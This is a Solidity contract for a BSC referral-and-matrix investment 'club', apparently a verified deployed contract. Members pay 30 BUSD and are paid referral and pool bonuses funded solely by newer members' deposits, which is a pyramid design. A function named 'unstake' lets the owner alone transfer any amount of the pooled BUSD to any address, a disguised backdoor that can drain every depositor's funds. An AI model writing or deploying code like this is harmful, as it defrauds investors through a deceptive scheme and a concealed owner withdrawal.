/**
 *Submitted for verification at BscScan.com on 2022-12-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Busdclub {
    using SafeMath for uint256;
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); // BUSD
    uint256 private constant baseDivider = 10000;
    struct Player {
        address referrer;
        uint256 myActDirect;
        uint256 withdraw;
        bool isReg;
        mapping(uint256 => uint256) levelIncome;
        mapping(uint256 => uint256) levelTeam;
        mapping(uint256 => uint256) b5Entry;
        mapping(uint256 => mapping(uint256 => uint256)) b5_level;
        mapping(uint256 => address) b5_upline;
        mapping(uint256 => mapping(uint256 => uint256)) clubIncome;
        
        mapping(uint256 => uint256) matrixArray;
    }
    mapping(address => Player) public players;
    mapping( uint256 =>  address []) public b5;
    
    address owner;
    uint[20] level_bonuses = [10e18, 2e18, 1e18, 1e18, 1e18, 4e17, 4e17, 4e17, 4e17, 4e17, 3e17, 3e17, 3e17, 3e17, 3e17, 3e17, 3e17, 3e17, 3e17, 3e17];
    uint[5] club_level1 = [10e18, 100e18, 1000e18, 10000e18, 100000e18];
    uint[5] club_level2 = [20e18, 200e18, 2000e18, 20000e18, 200000e18];
    uint[5] club_level3 = [60e18, 600e18, 6000e18, 60000e18, 600000e18];
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }

    constructor() public {
        owner = msg.sender;
        players[msg.sender].isReg = true;
        players[msg.sender].b5Entry[0]=1;
        for(uint8 i=0;i < 5; i++){
            b5[i].push(msg.sender);
        }
    }

    function deposit(address _referral,uint256 _amount) public {
        require(players[_referral].isReg==true,"Sponsor is not registered.");
        require(players[msg.sender].isReg==false,"You are already registered.");
        require(_amount == 30e18, "Invalid Amount");
        busd.transferFrom(msg.sender,address(this),_amount);
        players[msg.sender].isReg = true;
        players[msg.sender].referrer = _referral;
        players[_referral].myActDirect++;
        //referel
        _setReferral(_referral);
        // club
        players[msg.sender].b5Entry[0]++;
        b5[0].push(msg.sender);
        _setClub(0,msg.sender);
    }
    function _setReferral(address _referral) private {
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            players[_referral].levelIncome[i]+=level_bonuses[i];
            players[_referral].levelTeam[i]++;
            
           _referral = players[_referral].referrer;
            if(_referral == address(0)) break;
        }
    }
    function _setClub(uint256 poolNo,address _addr) private{
        uint256 poollength=b5[poolNo].length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/2; // formula (x-2)/2
        }
        if(players[b5[poolNo][_ref]].b5_level[poolNo][0]<2){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[b5[poolNo][i]].b5_level[poolNo][0]<2){
                   _parent = i;
                   break;
                }
            }
        }
        players[_addr].b5_upline[poolNo]=b5[poolNo][_parent];
        players[b5[poolNo][_parent]].b5_level[poolNo][0]++;
        address up=b5[poolNo][_parent];
        
        if(players[up].b5_level[poolNo][0]==2 && players[up].clubIncome[poolNo][0]==0){
            players[up].clubIncome[poolNo][0]+=club_level1[poolNo];
        }
        address up1 = players[up].b5_upline[poolNo];
        if(up1 != address(0)){
            players[up1].b5_level[poolNo][1]++;
            
            address up2 = players[up1].b5_upline[poolNo];
            if(up2 != address(0)){
                players[up2].b5_level[poolNo][2]++;
                if(players[up2].b5_level[poolNo][2]>=8 && players[up2].clubIncome[poolNo][1]==0){
                    players[up2].clubIncome[poolNo][1]+=club_level2[poolNo];
                }
                
                address up3 = players[up2].b5_upline[poolNo];
                if(up3 != address(0)){
                    players[up3].b5_level[poolNo][3]++;

                    address up4 = players[up3].b5_upline[poolNo];
                    if(up4 != address(0)){
                        players[up4].b5_level[poolNo][4]++;

                        address up5 = players[up4].b5_upline[poolNo];
                        if(up5 != address(0)){
                            players[up5].b5_level[poolNo][5]++;
                            if(players[up5].b5_level[poolNo][2]>=64 && players[up5].clubIncome[poolNo][2]==0){
                                players[up5].clubIncome[poolNo][2]+=club_level3[poolNo];
                                uint256 nextPool=poolNo+1;
                                players[up5].b5Entry[nextPool]++;
                                b5[nextPool].push(up5);
                                _setClub(nextPool,up5);
                            }
                        }
                    }
                }
            }
        }
    }
    
    
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        busd.transfer(buyer,_amount);
        return _amount;
    }
    function b5Info(uint8 pool) view external returns(address [] memory) {
        return b5[pool];
    }
    
    function userDetails(address _addr) view external returns(uint256 [5] memory pkg,uint256 [20] memory levelteam) {
         for(uint8 i=0;i<5;i++){
            pkg[i]=players[_addr].b5Entry[i];
        }
        for(uint8 i = 0; i < 20; i++) {
            levelteam[i] = players[_addr].levelTeam[i];
        }
        return (
           pkg,
           levelteam
        );
    }

    function poolDetails(address _addr) view external returns(uint256[5] memory clubTeam,uint256[5] memory clubTeam1,uint256[5] memory clubTeam2,uint256[5] memory clubTeam3,uint256[5] memory clubTeam4,uint256[5] memory clubTeam5) {
        for(uint8 i=0;i<5;i++){
            clubTeam[i]=players[_addr].b5_level[i][0];
            clubTeam1[i]=players[_addr].b5_level[i][1];
            clubTeam2[i]=players[_addr].b5_level[i][2];
            clubTeam3[i]=players[_addr].b5_level[i][3];
            clubTeam4[i]=players[_addr].b5_level[i][4];
            clubTeam5[i]=players[_addr].b5_level[i][5];
        }
        return (
           clubTeam,
           clubTeam1,
           clubTeam2,
           clubTeam3,
           clubTeam4,
           clubTeam5
        );
    }
    function incomeDetails(address _addr) view external returns(uint256 totalInc,uint256 wdl,uint256[20] memory lvinc,uint256[5] memory clubinc1,uint256[5] memory clubinc2,uint256[5] memory clubinc3) {
        for(uint8 i=0;i<20;i++){
            totalInc+=players[_addr].levelIncome[i];
            lvinc[i]=players[_addr].levelIncome[i];
        }
        for(uint8 i=0;i<5;i++){
            clubinc1[i]=players[_addr].clubIncome[i][0];
            clubinc2[i]=players[_addr].clubIncome[i][1];
            clubinc3[i]=players[_addr].clubIncome[i][2];
            totalInc+=players[_addr].clubIncome[i][0]+players[_addr].clubIncome[i][1]+players[_addr].clubIncome[i][2];
        }
        return (
           totalInc,
           players[_addr].withdraw,
           lvinc,
           clubinc1,
           clubinc2,
           clubinc3
        );
    }

    function withdraw(uint256 _amount) public{
        require(_amount >= 10e18, "Minimum 10 need");
        
        Player storage player = players[msg.sender];
        uint256 bonus;
        for(uint8 i=0;i<20;i++){
            bonus+=players[msg.sender].levelIncome[i];
        }
        for(uint8 i=0;i<5;i++){
            bonus+=players[msg.sender].clubIncome[i][0];
            bonus+=players[msg.sender].clubIncome[i][1];
            bonus+=players[msg.sender].clubIncome[i][2];
        }
        bonus=bonus-player.withdraw;
        require(_amount<=bonus,"Amount exceeds withdrawable");
        player.withdraw+=_amount;
        busd.transfer(msg.sender,_amount);
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}